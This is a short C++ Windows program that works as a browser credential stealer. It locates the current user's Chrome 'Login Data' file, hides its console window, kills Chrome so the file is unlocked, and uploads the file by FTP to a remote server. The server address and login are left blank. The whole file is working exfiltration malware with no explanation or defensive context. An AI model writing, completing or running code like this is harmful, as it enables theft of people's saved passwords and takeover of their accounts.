#include <sstream>
#include <wininet.h>
#include <windows.h>
#define UNLEN       256 


#pragma comment(lib, "Wininet.lib")
void UploadToServer(const char* file, const char* ftpname)
{
    HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFtpSession = InternetConnect(hInternet,"" , INTERNET_DEFAULT_FTP_PORT, "", "", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    FtpPutFile(hFtpSession, file, ftpname, FTP_TRANSFER_TYPE_BINARY, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

}
std::string toStr()
{
    DWORD len = UNLEN + 1;
    char username[UNLEN + 1];
    GetUserNameA(username, &len);
    return std::string(username);
}

int main() {
    
    std::ostringstream fpath;
    fpath << "C:\\Users\\" << toStr() << "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    FreeConsole();
    while(1)
    {
        if(InternetCheckConnection("http://www.google.com", 1, 0))
        {
            WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
            UploadToServer(fpath.str().c_str(), toStr().c_str());
            break;
        } 
    }
    return 0;
}
    